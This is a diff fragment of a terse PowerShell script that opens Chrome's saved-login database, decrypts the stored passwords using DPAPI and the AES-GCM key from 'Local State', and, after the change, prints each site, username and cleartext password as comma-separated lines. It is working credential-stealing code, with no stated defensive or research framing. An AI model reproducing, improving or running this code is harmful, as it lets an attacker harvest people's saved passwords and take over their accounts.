@@ -12,10 +12,9 @@ $s=[W]::O("$z\\Default\\Login Data",[ref]$d)
 $t={($args[0]|%{[char]$_})-join''}
 if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
 $x=[Security.Cryptography.AesGcm]::New($u::Unprotect([System.Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
-for(;!([W]::S($s)%100)){[W]::T($s,0)
-[W]::T($s,3)
+for(;!([W]::S($s)%100)){$l=[W]::T($s,0)+","+[W]::T($s,3)
 $c=[W]::B($s,5)
-try{.$t $u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
+try{$l+","+(.$t $u::Unprotect($c,$n,0))}catch{if($x){$k=$c.length
 $e=[byte[]]::new($k-31)
 $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)
-.$t $e}}}
+$l+","+(.$t $e)}}}
